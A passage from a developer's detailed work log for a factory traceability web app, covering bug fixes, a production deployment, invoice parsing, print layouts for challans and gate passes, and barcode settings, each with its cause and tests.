`test_build_banner` checks `git check-ignore`, which needs a real `.git`.

### New indent form showed the previous form's stale copy until the fresh one arrived

`test_indent_properties` failed 1 run in 3. `indNew()` reopens the panel with the LAST
form's HTML (and what was typed in it) still in it, then fetches the empty form and
swaps it in - anything typed into the stale copy was wiped. A person rarely types
inside those few milliseconds; a script does. The panel is now emptied when it opens.
The test also waits for the "saved" toast and for the form to close (`indNew()` is a
toggle: called while the form is still closing it closes it instead). 10 of 10 runs
clean, was 5 of 8.

### Drag and drop onto an upload control

Reported: "drag and drop in upload option is not working". Confirmed in Chromium with a
real File in a real DragEvent: Production Entry's "Drop the production sheet here"
(v4) had nothing wired to it - a drop did nothing, and the browser's own answer to a
file dropped on a page is to open it in place of the app. The invoice screen's zone
already worked (its own handlers); Planning's custom-serial upload was a bare file
input with no drop target.
- `iconDropZone(zone, input, pattern, what)` in `icon_live.js`: a dropped file is put
  into the real input and the input's own `change` runs, so it takes exactly the path a
  chosen file takes. The file NAME is checked against a pattern (the input's `accept` is
  not applied to a drop), several files use the first and say so, the zone highlights.
  Wired to Production Entry, Planning's custom serials and the invoice parser.
- A page-wide guard: a file dropped OUTSIDE a registered zone is not opened by the
  browser. A zone must be REGISTERED (`data-dropzone`) or the guard's "not allowed"
  cursor would block a real drop - which a synthetic event cannot show, so the test
  asserts registration for every zone.
- Not fixed, found: the live Indent form's "Indent PDF" input is not read by its save
  code at all (only the legacy server-rendered indent page stores a PDF), so there is
  nothing to attach a drop to; and the legacy `challan_import.html` page has plain
  file inputs. Needs Mukesh: should the live indent form attach the PDF?
- `test_upload_drop.py` (6); mutation check caught 5 of 5.

### Deployed to production (2026-10-03, 10:58 IST)

Commit `d352910` -> `C:/Users/X/Videos/ICON_TRACE` (production, port 8080, all interfaces).
- The production server was `serve.py` run from IDLE (cwd the Videos folder). The server on
  8090 is the TESTING one, run from `D:/GITHub/ICON_TRACE` (localhost only).
- Order: online snapshot + code zip -> dry run of the final code on a copy (migrations 0.4 s,
  no rows lost) -> stop -> final snapshot -> 55 files copied (36 changed + 19 new; the 92
  line-ending-only differences were left alone) and byte-checked -> 8 incharges seeded
  (Yaman, Rajkumar, Kamta, Deepak, Akshay, Umendra, Devendra, Yukesh) -> start -> checked.
  Down for about 25 seconds. Row counts identical before and after; integrity_check ok.
- Now a detached process (logs `server_stdout_r38.log` / `server_stderr_r38.log` in the
  folder), not under IDLE. Same defaults as before (no ICON_* variables).
- Rollback: `C:/Users/X/Videos/ICON_TRACE_backups/2026-10-03_pre_round38/` holds
  `code_before.zip` (extract over the folder) and the database as it was
  (`icontrace_final_pre_swap.db`). The migration only ADDS columns and rows, so the old code
  runs on the new database.
- A snapshot of the production database (integrity-checked) was copied into
  `D:/GITHub/ICON_TRACE/icontrace.db`; the previous test database is kept beside it as
  `icontrace_before_production_copy_20261003_1058.db`. Production keeps its own.
- Still to do by hand: upload the September / October traceability files in backfill mode and
  tick the already-imported ranges - 45 batches hold only 4 raw-text materials each.

### Master data: does an edit persist? (asked 2026-10-03)

Yes for materials and their vendors (makes): Save -> PUT /api/material/<n> -> the `material`
table; proved in Chromium (DB row, F5, a second session). The Models, Stations, Reason
codes and Users lists are page-only and refuse edits with a reason. What made it look
unsaved: v4's dialog subtitle "Changes apply immediately on screen. In the built system
this is a single save." Now, for saved kinds, it says "Save writes this to the database -
it stays after a refresh and applies to everyone." `test_master_data_ui.py` (+1).
Known cosmetic: the "updated" toast lists unchanged blank fields (null vs '') as changed.

### Open, needs a decision, or not touched

- **Restart needed** for any of this to be live; the store migration then runs on
  the live DB (the per-scan merge above).
- **FIXED, and it was worse than the note said**: the `ss_skip` detector found
  nothing at all, ever. `_el_recent_files` took the newest folders BY NAME and
  the share has a stray `New folder` ('N' sorts above '2'); the poller asks for
  one day, so that was the only folder it looked in, and it holds verdict
  folders directly - no images, no candidates, no items. Folders are now chosen
  by the DATE they name (the share has both `2026-09-29` and one `16-09-2026`),
  and an undated folder is ignored. Simply pointing it at the right folder would
  have flooded Needs Review - the CSV is cut each shift and no archive path is
  set - so each candidate is now confirmed against the tester's own result file
  before it is flagged, and if nothing can confirm it (no archive, no result
  files) nothing is flagged at all. Measured on the real share: 622 EL images,
  15 candidates, all 15 had a result file, so the detector raises 0 items in
  1.3 s - honest rather than dead. `ss_*_archive_path` is still blank and still
  only settable through /api/settings.
- **Line B is not configured** (`el_b_root`, `ss_b_csv_path` blank), so its EL
  vocabulary has never been listed; Line A's 11 folders all map today.
- **Still open from the Round 35 review**: `test_seq` is 1 for a retest of any
  module decided before Stage 3; `_reconcile_provisional` now "confirms" a
  provisional reject made with SS = NA (it used to wait) and its `system` record
  takes a `test_seq`; entity_revision covers 2 of at least 6 FQC write points;
  `/export/fqc.csv` still writes `proposed`/`reason`; Stage 6 not started;
  `templates/icon_trace.html` was edited above the live-layer marker in Round 35.
  For Stage 6: a decision made before Planning has NO serial row until it is
  planned, so a feed that joins `serial` will not list it until then.
- **Tests red for other reasons**: `test_packing` (2), `test_indent_export` (4),
  `test_search_invoice` (3) since `73eeb5c` titlecased the customer master
  (all 5,360 live serials store "ICON STOCK" / "BOROSIL RENEWABLES LIMITED",
  which no longer equals a canonical name); `test_demo_claims` (2, since Round
  34); `test_cancel_documents` (1, hard-coded date). `test_stored_xss.py`, the XSS safety
  net, had been dead since Round 35 (it planted into the removed `reason` field,
  and filed a production entry for "shift A of today", refused between 00:00 and
  06:00): repaired, and it passes - 25 screens, 0 payloads ran.

## 3 Oct 2026 - invoice parser, QR card, pallet Print, favicon, assignment history

Found with three real invoices (SADBHAV 911, KANAK 899, SRVS 822) and the
testing server on :8090. Each line: what was wrong, cause, change, test.

- **Pallet Print on the Packing Log said "No packing list found".** The screen
  has two renderers. The one that runs on landing passed the pallet NUMBER
  (ISPL261001/K001) to `/api/print/resolve`, which knew only a legacy number or
  the bare sequence. The one behind Apply passed the bare sequence, which repeats
  every day and so named the wrong pallet once a second day had a pallet 1 (and
  showed "1" / "2" in the Box no. column, and the customer CODE, not the name).
  Change: `/api/packing/log` returns `label`, `customer_name`, the shift on the
  clock when the pallet was opened, and a `status`; Print opens
  `/box/<box_id>/sheet` directly; the resolver now also takes a pallet number and
  refuses an ambiguous bare sequence. One renderer (`renderPackLog` = the
  server-filtered one). Test: `test_print_and_favicon.py`, and in a browser on a
  copy of the live database.
- **Packing Log Status filter never matched.** A box row is only open / closed.
  v4's dropdown offered Packed / Repacked / Challaned / Dispatched, so Packed
  returned nothing and "Awaiting challan" was always 0. Status is now derived
  from the challan the pallet sits on: open, packed (closed, on no live challan),
  challaned (on a live draft or issued challan), dispatched (that challan has a
  live gate pass). **[open]** Mukesh: is "gate pass exists" the right line for
  "dispatched"? (The serial itself turns `dispatched` at challan issue.)
- **Invoice QR card always said "Nothing decoded yet".** `iconShowInvoice` never
  filled `#invQr`; only v4's demo `invSim()` did. The parser had decoded both QR
  codes all along. Now shows the e-invoice identity fields (never the amounts),
  the e-Way Bill text and the parser's QR checks (seller is Unit-2, number
  agrees); an invoice opened for editing says whether its QR was read.
- **Invoice parser.** (1) References carried dates ("ISEN/PV/26-27/143 dt.
  28-Jul-26", LR "18695 dt. 11-Sep-26", LR "dt. 3-Oct-26" with no number): now the
  number only, blank when there is none; NIL / NA read as blank; an order date
  with no order number is blank; `po_no` is optional. (2) **Vehicle number was
  blank on KANAK 899**: a rule that closes the Consignee box sat at the same
  height inside the Motor Vehicle cell, so the cell was cut off above its value.
  Rules are now only used where they span the label's column. (3) Contact: "Contact
  number +918818877788" was not read (a +91 prefix defeated the pattern, and the
  word "number" looked like a name); now ten digits, label stripped. (4) A leading
  "Delivery Address -" is dropped from the ship-to address. Test:
  `python icon_invoice_parser.py --selftest` (new cases) and the three PDFs.
- **No icon on print tabs.** Gate pass, challan, FTR, pallet sheet, labels,
  barcode sheet and the authenticator page had no `<link rel="icon">` (24 Sep's
  favicon covered only `base.html` and v4). Added to all seven, plus a
  `/favicon.ico` route (no session needed) for pages that cannot name one. Test:
  `test_print_and_favicon.py` scans every full-page template.
- **Customer assignment history.** An Icon Stock pallet put on a customer's
  challan took the customer's name (`assign_customer_on_challan`) but left only a
  bare audit row, and the module's history still read "Original allocation"
  only. Now one row per real change: who it was (Icon Stock), who it is, the
  reason ("Delivered on challan IS-... against invoice ..."), who and when, shown
  in Search & Trace. Written only when the owner actually changed (it used to log
  even when nothing did), once (submitting a draft does not log it again). Rows
  written before this say the reason was not recorded. Test: two in
  `test_challan.py`. The reason is built from the challan, not typed: **[open]**
  Mukesh, if a person should type one, say so.
- **Observed, not changed.** (a) Cancelling a challan returns the serials to
  `packed` but leaves the pallet owned by the customer it was given, so it stays
  out of other customers' selectors. DECISIONS is silent; needs Mukesh.
  (b) v4's invoice field form puts values in `value="..."` without escaping, so a
  quote in a parsed value breaks the input. (c) `test_pack_ui.py` is a dead smoke
  script (it calls v4's removed `signIn()` against :8090 anonymously).
- Not on this machine: `node` is not on PATH. `node --check` was run with
  Playwright's bundled node (`...\site-packages\playwright\driver\node.exe`).

## 3 Oct 2026 (evening) - Challan V1 and gate pass print in the plant's layout

- **What was wrong:** the V1 print was a plain table with no logo and no QR; the
  gate pass header had a text "EN-ICON" placeholder with the document block
  beside the logo. Mukesh sent the plant's own V1 (IS-MP-STR-FM-09) and the
  EN-ICON logo SVG.
- **Change:** `templates/challan_print.html` rebuilt on the plant's form, filling
  one A4 page: logo + company name + QR (`ICONTRACE|CHALLAN|<no>`, decodes) on
  top, document block below, consignee and buyer with address / contact / GSTIN /
  state taken from the invoice, pallet numbers listed in the goods area. Fixed
  text and contacts in `icon_challan_form.py`; the route cleans what an older
  parser stored (the "Delivery Address -" label, a dangling "Contact number", a
  date in the LR slot) at print time, the challan row is untouched. Gate pass:
  same header (real logo, QR, document block under it). Logo in
  `static/enicon-logo.svg`. Test: `test_print_and_favicon.py` (V1 content and
  order) and the page rendered to PDF in Chromium: one page, QR decodes.
- **Decided on instinct, change if wrong:** "LR.NO." on the plant's form holds
  the vehicle number, so V1 labels it VEHICLE NO. and keeps LR COPY NO. for the
  real LR number; Revision shows the form's own 0 / 01.03.2026 (the Excel V2 header
  still says "Rev 1" - not changed); freight boxes blank; Mob. is the driver mobile
  and is empty when none was entered on the challan.
- **Not done:** V2 (the Excel) is unchanged - it is still the plain sheet, not the
  plant's CHN-910 layout.

## 4 Oct 2026 - Cancelled FQC grade no longer leaves a stale Needs Review item

- **What was wrong:** cancelling an FQC grade (`/api/fqc/cancel`) reset the serial
  to `produced` but left an open `duplicate_scan` / `provisional_mismatch` row
  that named the cancelled record, so Needs Review kept counting a decision that
  no longer stood (listed as "found, not fixed" at the end of Round 34).
- **Decision (Mukesh):** auto-close, not a lingering "was cancelled" state.
- **Change:** in the cancel loop, open items whose `fqc_id` or `new_fqc_id` is the
  cancelled record are resolved as `record_cancelled`, by the canceller, with the
  cancel's own reason; audited `review.record_cancelled`. The Quality-pending item
  is derived and already drops out (it needs `serial.state='rejected'`).
- **Test:** `test_cancel_documents.py` (new case; fails without the fix, another
  serial's item stays open). Edge noted, not changed: FQC cancel is refused once a
  serial is packed, so a `duplicate_scan` rarely meets it.

## 4 Oct 2026 - Grade band back on the module journey

- **What was wrong:** the Round 35 redesign made the FQC step read "Pass", where it
  used to read "A" (the open "Decide" in the 13 Sep test note).
- **Decision (Mukesh):** show the band on the pass; none on a reject.
- **Change:** `app.py` journey - FQC step value is "Pass · A" when the record carries
  a grade. Quality Decision already showed the final band. Tests
  `test_fqc.py`, `test_defect_readers.py` updated to the new wording; checked in
  Chromium (Search & Trace, no page errors).
- **Not done:** no `t_grade` column - not needed, see DECISIONS section 6.

## 4 Oct 2026 - LOP dating: NOT reviewed, skipped on purpose

- [x] **Loss of Production (LOP) dates need a proper pass before LOP is used for real.**
  Done 6 Oct 2026 at Mukesh's request - see "LOP: a loss belongs to a production date
  and shift".
  Mukesh's priority is indent to dispatch; the plant runs the same without LOP, so
  LOP was deliberately left alone. Do not read the green tests as "dates are right".
- **What is known** (code read, nothing changed): the Production Dashboard and
  `/api/loss_events` count a loss event by `created_at` (IST, 06:00 day), not by
  `event_date`. That is right for a **Live** event (opened when the machine stops).
  A **Retro** event has no date field - the form sends today's date - so downtime
  entered the next morning lands on the wrong day. First noted in the Round 35-era
  "Swept, same flow, NOT changed" entry (grep "Retro event is the gap").
- **Why it came up:** an outside review of the code guessed a date bug here from a
  test that hard-codes 2026-09-28; the test passes (it sets `created_at` itself). The
  review's guess was about Retro, which is real; it is not new damage.
- **To decide before LOP goes live:** add a date field for Retro (and the start/end
  times that belong to it), and whether `event_date` or `created_at` is the counting
  day for a Retro event. Affects downtime and any later OEE.

## 4 Oct 2026 - Quality downgrade of an FQC pass: decided, not built

- [ ] **Build the Quality downgrade of a passed module (A -> GY / BGY), before packing.**
  Rule, roles, step-up and journey wording are in DECISIONS section 6. Waiting on a
  separate discussion of WHICH SCREEN (a pass has no Needs Review item, and the
  Quality screen was merged into Needs Review). Do not guess a screen.
- **Why `t_grade` came up:** Mukesh's intent was FQC's call shown apart from the final
  grade (A on a pass, R on a reject pending Quality), `grade` = the final value every
  filter reads, and the journey showing Quality's upgrade/downgrade. Checked: `t_grade`
  was never in the repo (design only); `serial.grade` already behaves as the final
  grade (empty while a reject waits, Quality's value after); the FQC step now shows
  the band (`aaaf386`). What is missing is only the downgrade of a pass.
- **When built:** `record_quality` / `/api/quality` accept a `graded` serial that is
  not packed, with a reason and `_require_stepup`; the Quality Decision step shows
  FQC band -> final band; update `test_fqc.py` "Quality cannot grade a module FQC
  passed" to the new rule; dashboard roll-up needs a "Passed -> GY/BGY" row.

## 4 Oct 2026 - Pack scan names the reason a module will not pack

- **What was wrong:** the pack scan refused with a few generic sentences. A serial
  that is not in the master read the same whether the tester had seen it or not; a
  provisional hold said "can be packed once the evidence agrees" even when the
  evidence had already disagreed; a module whose FQC grade was cancelled, or a
  cancelled serial, read "Not FQC'd" / "passed FQC ... record reads cancelled"; and
  the preview's FQC cell said "Passed" beside a provisional hold and "Not FQC'd"
  beside a serial not in the master.
- **Change:** `app.py` `_pack_block(cur, serial)` returns (category, sentence) from the
  records (review_item, ftr_reading, fqc_record incl. a cancelled one, serial state);
  `_pack_refusal` uses it, so the pallet scan, `/api/box/check` and Repack all say the
  same. `/api/box/check` returns `category`; `icon_live.js` shows it in the FQC cell.
  Eight reasons named; "Not FQC'd" wording kept for the plain case.
- **Test:** `test_pack_readiness.py` (eight reasons, eight different sentences,
  preview and scan identical; fails on the old code). Checked in Chromium for a
  provisional hold and a serial not in the master. `node --check` clean.
- **Noticed, not changed:** `/api/serials/cancel` falls back to the reason
  "serial cancelled" when none is sent, against the "never a default reason" rule
  (DECISIONS section 1). Needs Mukesh before it is touched.

## 4 Oct 2026 - Cancel routes no longer invent a reason

- **What was wrong:** eight cancel routes (indent, indent line, gate pass, production
  entry, loss event, invoice, serial, FQC grade) swapped a blank reason for a canned
  string ("serial cancelled" ...), against DECISIONS section 1. The challan cancel
  already refused. The Cancel screen always asks for a reason, so only a direct call
  or a stale client could reach it.
- **Change:** a missing or blank reason is now a 400, "A reason is required to cancel
  <thing>.", checked before the authenticator step (same order as the challan cancel).
- **Test:** `test_cancel_documents.py` (all nine routes, missing and blank). Every test
  that touches cancel or discard still passes.
- **Not changed:** `/api/box/<id>/abandon` still fills "Abandoned - opened, nothing was
  ever scanned into it." when none is sent. It states a fact rather than inventing a
  motive, but it is the same pattern - Mukesh to say.

## 4 Oct 2026 - Addendum to "Pack scan names the reason a module will not pack"

- **Fix after the full run:** the provisional refusal must keep the words "on hold" - `test_fqc.py` (held pass is not packable) asserts it, and I had run that file before the pack change, not after. Reworded; test_fqc 54/54, test_pack_readiness 10/10.

## 4 Oct 2026 - printed documents redesigned (premium) with the plant's original kept (classic)

- **Asked:** the plant's own challan layout "does not look premium": redesign it, keep
  only the information that is required (find which fields are permanently blank in
  the plant's V2 Excel files), research good document design, and keep the clone
  as a backup in case management wants the original.
- **Evidence:** all 961 challan workbooks on the share (March-October 2026) were read
  read-only. Never filled (0 genuine values): Pay transporting Amount (Icon /
  Customer), Transporting amount, Advance amount, Balance Amount, Total Amount.
  Filled almost always: vehicle 100% (stored under the label "LR.NO."), mobile 99%,
  transporter 92%, LR copy no. 81%. Typical load 20 pallets x 36 = 720 modules (max
  24 pallets, 864 modules); 2% of challans mix models; consignee = buyer in 5%;
  longest consignee text ~325 chars, buyer ~355, transporter 41. Form revision:
  900 files on Rev 1 / 10.01.2024, the 55 latest (from ~30 Sep) on Rev 0 / 01.03.2026.
- **Change:** `templates/challan_v1_premium.html` and `gatepass_print_premium.html` (the
  redesign, clean letterhead direction; Poppins bundled under `static/fonts/` with their OFL
  licences) beside `challan_v1_classic.html` and `gatepass_print_classic.html` (the
  plant's forms as they were). Both read `icon_challan_form.print_context` /
  `icon_gatepass_form.print_context`. Setting `print_style` (Settings, Super Admin) and
  `?style=` choose; every print page links to the other format. The redesign was
  explored by four independent drafts (Swiss, brand band, cards, title block),
  judged through three lenses (gate and mono-laser, premium and brand, print
  engineering); management then supplied a reference look - a clean letterhead:
  logo top-left, a large light title top-right with the number under it, plain
  unboxed address blocks, a charcoal table header, a light grey total band - and
  the final was built in that style with the judges' technical findings, QR added
  and no money columns. Every candidate was rendered in Chromium against realistic
  fixtures and the plant's 45 real challans; the final passes all of them (one
  page, every printed fact present, no freight box) and the gate pass prints three
  pages (one per copy) for 1 to 12 items.
- **Also fixed on the way** (both formats): the classic spilled onto a SECOND page for
  a 20-pallet truck (the plant's commonest load) and a challan with several models
  printed one blended line ("A + B", average wattage) - goods are now one line per
  model with exact kW; a DCR item lost its "-DCR"; the ship-to printed Tally's
  "Delivery Address -" label and its contact twice; Chrome/Edge printed their own
  header and footer (date, title, the server URL) onto the sheet.
- **Tests:** `test_challan_form.py` (pure), `test_challan_print.py` and
  `test_gatepass_print.py` (both formats, the setting, the dropped fields),
  `test_challan_print_ui.py` (real Chromium: one printed page for 1 and 20 pallets,
  the QR reads the challan's number, fonts and logo load, the toolbar stays off the
  paper), `test_print_style_setting_ui.py` (the Settings control).
- **Decided on instinct, change if wrong:** a "Security (gate)" signature box is
  printed (the plant's form has none, but this is the gate pass); the form-control
  line (Doc No, Revision 0, 01.03.2026) is small, at the foot; freight is not printed.
- **Not done:** the Excel V2 is unchanged (still the plain sheet, no QR); the pallet
  sheet / labels keep their own layouts.

## 5 Oct 2026 - Packing list barcodes: Code128 Auto, real size, text from Settings

- **Asked:** the packing list's barcodes were far wider than the same serial from
  Zebra Designer 3 (Code128 Auto); the human-readable text was too small; with
  barcodes on, the on-screen sheet ran past the page margin (printing was fine).
  Use Code128 Auto, turn the barcode's own text off, and print the serial under
  it as text whose font, size, letter spacing, bold, italic etc. can be set, as
  in Bartender / Zebra Designer - always below, always centred on the barcode,
  fixed size.
- **Evidence:** `icon_barcode.code128_svg` encoded subset B only ("no subset
  switching is needed"): 233 modules for every 18-character v2 serial. The sheet
  sized each SVG by height (`td.bc svg{height:11mm}`), so its width followed the
  aspect ratio - 91 mm in an ~80 mm cell - and the text, inside the SVG, shrank
  with the bars to ~2.5 mm. Chrome shrinks an over-wide page to fit when
  printing, which is why the print looked right.
- **Change:** `code128_codes` / `code128_modules`: Code128 Auto, B and C, optimal
  switching. `code128_bars_svg`: bars only, at 0.254 mm (10 mil - 3 dots at
  300 dpi, 6 at 600, 2 at a 203 dpi Zebra) and 11 mm, quiet zones included.
  `text_style` / `clean_text_settings` / `TEXT_FONTS`: the text settings,
  validated, stored as keys (never CSS). Pallet sheet: barcode and text sit in
  one box as wide as the wider of the two, both centred; `table-layout:fixed` so
  nothing in a cell can widen the table. Settings > Stations & sources: a
  "Barcode text - packing list" card with a print-size preview of the widest
  serial in a box the width of the real cell, which warns and refuses Save when
  the text would overrun it. `code128_svg` kept, unchanged in output.
- **Found on the way:** letter-spacing is added after the LAST letter too, so
  centred spaced text sits half a space left (Chromium 141: 3.5 px at 6 pt); a
  negative right margin of one spacing takes it back (0.5 px, glyph rounding).
  `python-barcode`'s Code128 is not a safe drop-in: it encodes `99ICON` as a
  barcode that scans `ICON`.
- **Tests:** `test_box_number.py` (+4: widths 189/211/167, no lossy start, bars
  in mm, text style), `test_barcode_text.py` (server: defaults, save, refusals
  store nothing, Admin 403, sheet markup, Settings fragment),
  `test_barcode_text_ui.py` (Chromium: text ink centred on bar ink within 0.5 px
  for both widths at three settings; sheet inside the page on screen and at A4
  print width; Oct-Dec 5.59 mm wider; preview box = real cell within 1 mm;
  Settings preview, refusal and save; Admin locked with the reason). Also
  verified outside the suite: 6,020 encodings decoded by zxing-cpp; all four
  barcodes and the QR read off a printed A4 PDF at 150 dpi.
- **Decided on instinct, change if wrong:** defaults Arial 10 pt bold, no
  spacing, 0.8 mm gap; size 6-20 pt, spacing -1 to 6 pt, gap 0-5 mm; underline
  is offered (with letter spacing it runs one spacing past the last letter);
  bar width and height are fixed, not Settings - their limit depends on the
  cell, which the pending design system may change.
- **Not done:** the rest of the packing list's look waits for the challan V1
  design system to be signed off. Not yet scanned with the plant's handheld.

## 5 Oct 2026 - Packing list barcodes: two defects found when the patch went in

- **Wrong 1:** `GET /settings` (the standalone Settings page) answered 500,
  `'bc_fonts' is undefined`; so did an Admin's refused form post (403 path).
  Found by `test_role_gates.py`, which the patch's own tests do not run.
- **Cause:** `frag_settings.html` is rendered by two routes - `/view/settings`
  and the page `/settings`, which includes it. The patch gave the new "Barcode
  text" card its variables in the first and not the second.
- **Change:** `_settings_context(cfg)` builds every variable the fragment reads,
  once; the fragment, the page and the page's 403 re-render all use it.
- **Wrong 2:** `test_barcode_text_ui.py` "text centred on the bars" failed on
  this machine (real Arial on Windows): ink 1.17 px off, limit 0.5.
- **Cause:** it compared the painted INK of the text with the ink of the bars,
  and ink is not the box. The "1" that ends a serial has a wide right bearing, so
  Arial Bold's ink sits about 1 px left of its box on any layout (canvas
  `measureText` predicts the same sign and size). The box itself was centred to
  0.01 px, letter spacing included - the CSS was right, the measure was not.
- **Change:** the test checks the text's box against the bars (0.5 px) and its
  painted ink against the SAME text unspaced (0.5 px), which cancels the font's
  bearings and leaves what the setting moved. Mutation check: without the
  negative right margin it fails (-2.66 px at 4 pt spacing).
- **Tests:** `test_barcode_text.py` +1 (the `/settings` page and an Admin's
  refused post carry the card); `test_barcode_text_ui.py` centring as above;
  `test_role_gates.py` back to 11/11.

## 5 Oct 2026 - Print of an edited challan opened the superseded original

- **Reported:** after an edit (the original superseded, a new challan made) and
  Loading Verification completed, Print (v1) showed an error. The guess: it uses
  the original URL, `/challan/2026/1/print`.
- **Evidence:** reproduced in Chromium on three pallets: the detail panel of the
  live (MA) version links `/challan/2026/1/print`, which answers 400 "This challan
  has been superseded by an edit - print IS-05.10.2026/0001 (MA) instead." A bare
  (fy, seq) is the row with no suffix - the original - and the server is right to
  refuse it (`test_challan.py`, "printing a superseded challan by its BARE number").
- **Cause:** `icon_live.js` built every document link from fy and seq alone
  (`chRenderDocs`, the detail panel's Print and Excel), and `/api/print/resolve`
  did the same for v4's print buttons. The suffix was always available - the
  create/edit response, the list and the detail all carry it - and never used.
- **Change:** `chDocUrl(c, doc)` adds `?suffix=MA` for an edited version and is used
  by both screens; the detail panel offers no Print / Excel on a cancelled or
  superseded challan (they could only open a refusal) - a superseded one has "View
  the replacement"; `/api/print/resolve` carries the newest challan's suffix. The
  server's refusal of the bare number is unchanged.
- **Found on the way:** `test_loading.py` "editing a challan produces fresh
  challan_box rows at 'pending'" printed the BARE number after an edit and read the
  superseded refusal as "needs its own verification" - it passed for the wrong
  reason, and nothing printed an edited challan after its own loading. It now asks
  by suffix and checks the loading message; a new test prints, exports and takes
  the Flash Test Report of the edited version once its loading is submitted.
- **Tests:** `test_challan.js` +1, `test_loading.py` +1, `test_challan_edit_ui.py`
  (new, Chromium: edit through the screen, load, then the Print link opens the
  printed MA challan with the edited driver mobile; the original offers no Print).
  Each of the three fails on the old code with the bare URL.

## 5 Oct 2026 - Saving an edit with nothing changed still superseded the original

- **Reported:** edit a challan, press Save, change nothing - the original is
  still cancelled and a new one made. (The last words came as "it should cancel
  original"; read as "should NOT", since that is the complaint.)
- **Evidence:** in Chromium, three pallets, full transport details: Edit -> Save
  changes, nothing touched, posted exactly what was stored; the server answered
  200 `(MA)`, the original became `superseded`, and the toast read "... saved,
  replacing ... 6 serial(s) dispatched".
- **Cause:** `api_challan_edit_save` compared nothing - every save was a new
  version. And the Edit form was not a faithful copy of the challan: it opened on
  today's date and filled the buyer and consignee from the INVOICE (those fields
  are hidden on this screen, "the invoice's own"). So an untouched save on a later
  day re-dated the challan (its number carries the date), and a buyer or consignee
  that differed from the invoice's was silently re-read from it.
- **Change:** `_challan_header` is the one reader of a posted form, used by Create
  and by the comparison, so the two cannot disagree. `_edit_changes_nothing`
  compares the pallets (in order), date, buyer, consignee and transport; the same
  means `changed: false`, nothing written, nothing audited, no suffix used. A real
  save answers `changed: true`. `edit-draft` returns the challan's own date,
  buyer, consignee and transport and `chBeginEdit` puts them in the form; an edit
  that leaves the date out keeps the challan's. The toast says "Nothing was
  changed". Superseded / gate-pass / invoice refusals still come first.
- **Changed tests:** three used a no-change save as shorthand for "make a
  version" (`t_edit_invoice_locked`, `t_edit_resolves_box_no_to_box_id`,
  `t_edit_save_refuses_non_issued`); each now makes a real change.
- **Tests:** `test_challan.py` +5 (nothing writes; invoice-sourced buyer; every
  field - and a pallet reorder and swap - makes a version and round-trips; the
  date; edit-draft's own values), `test_challan_edit_ui.py` +3 (Chromium: an
  untouched Save; a challan dated yesterday; a typed buyer and consignee). The
  server and browser ones fail on the old code.
- **Open:** a real edit now keeps the challan's date; it used to take the day of
  the edit, as a side effect of the form. See DECISIONS section 3.

## 5 Oct 2026 - Packing list barcode: the bars are Settings too

- **Asked:** the Settings card only let the text under the barcode be edited; add
  controls for the barcode itself - module width, height, "etc".
- **Change:** three settings beside the text ones (Settings > Stations & sources >
  "Barcode - packing list"): module width 0.15-0.40 mm (default 0.254), height
  6-20 mm (11), quiet zone 10-25 modules (10). `icon_barcode.BAR_DEFAULTS` /
  `BAR_RANGES` / `clean_settings` (text and bars validated together, all or
  nothing) / `bar_params`; the sheet draws with `bar_params(cfg)`. The preview is
  redrawn as you type (the SVG carries `data-modules` / `data-quiet`), shows the
  barcode's width, the dots it is at 300 and 600 dpi, and about how tall a sheet
  row is; "Reset to defaults" fills the standard values (Save keeps them).
- **Checked on the server this time:** unlike a font, a bar's width is exact, so
  `api_settings` refuses a width at which the widest ICON serial plus its quiet
  zones exceeds the 80 mm cell, judged on the stored values with the save laid
  over them (a quiet zone alone can overflow beside a stored width). The preview
  still measures bars plus text together in the browser.
- **Found on the way:** the preview's cell was a border-box, so its inside was 1 px
  a side short of the 80 mm it models and it refused a barcode the server accepts;
  now 80 mm of content. The real print cell measures 80.14 mm (81.46 on screen).
- **Not changed:** a full 36-module pallet is two pages at the defaults - as it was
  before the barcode patch (checked on c6d51d0) - and three at 20 mm bars.
  Custom (non-ICON) serials, up to 40 characters, can be far wider than the
  211-module sample; neither the check nor the preview covers them.
- **Follow-up, same day:** the preview warned on a barcode that looked short of
  the cell (screenshot: bars with room either side, "Wider than the packing list
  cell"). The room was the quiet zones - blank, so invisible - and a 20-module
  quiet zone at 0.33 mm is 82.8 mm. Now: the limit is the cell up to its border
  (80 mm print area + 2 mm padding each side = 84 mm; the quiet zone is white, so
  it may use the padding, never the border line); the sheet centres a wider barcode
  (`.bcs` is a flex box - text-align spilled it all to the right); the preview box
  is that cell, the quiet zones are shaded, and the warning gives both widths. The
  preview also compared against `clientWidth`, which rounds to whole pixels, so
  it could refuse what the server accepts - now the exact computed width.
- **Tests:** `test_box_number.py` +1 (validation, fallbacks, drawn width = computed
  width), `test_barcode_text.py` +2 (saved and printed; overflow refused, judged
  on stored values) and the refusals / fragment tests widened,
  `test_barcode_text_ui.py` +2 (Chromium: the preview redrawn, warns, refuses and
  resets; bars saved from the card print at that size, the widest the cell holds
  included, inside the page with the text centred) and the Admin lock extended.

## 5 Oct 2026 - /settings was a second app; it now lands in Admin > Stations & sources

- **Reported:** "/settings should land on /#admin > Stations & sources ... /settings
  is another app" (and Stations & sources "reverted to old", which could not be
  reproduced - see below).
- **Evidence:** `/settings` has been a standalone page since the first commit
  (git: 8ca6e49), with its own cut-down sidebar ("Back to the main app", Evidence
  Sources) - it never redirected. Evidence Sources was merged into Admin > Stations
  & sources on 8 Sep (`mergeEvidenceSources`); production (:8080 folder, read-only)
  has the same code. In a browser the Stations tab shows the merged card (Line A/B,
  Plant, Barcode, Database) above v4's own tables - nothing had reverted. And the
  hash only understood a screen: `/#admin` opened the Users tab, `/#admin/stations`
  fell back to home.
- **Change:** `GET /settings` redirects to `/#admin/stations` (signed in or not;
  it shows nothing itself, the fragment stays gated); the POST keeps its gate. The
  hash can name an Admin tab, `#admin/<tab>`, read off the tab buttons' own
  onclick (no second list of ids; an unknown id does nothing, and a screen the
  account cannot view still lands on its home); picking a tab writes its hash so a
  refresh returns to it; the first tab stays `#admin`.
- **Tests:** `test_hash_route.py` +3 (the tab in the hash, refresh, unknown tabs
  ignored, an account without Admin not forced onto it; `/settings` followed in a
  real browser ends on Stations & sources with the barcode card),
  `test_barcode_text.py` (the redirect for every caller, the fragment for Admin
  and Super Admin), `test_role_gates.py` (an Admin still reads the fragment).


## 6 Oct 2026 - overnight-filter-work merged into main

- **Asked:** merge the `overnight-filter-work` branch (25 Sep: one shared filter
  cascade, `_dashCascade` / `_facetSet`, for every dashboard). It forked 82 commits
  back; two conflicts, both where main had moved past it.
- **Kept from main:** the FQC Dashboard's customer folding (code or name, any case,
  one option per customer) and the server's own customer list (read BEFORE the
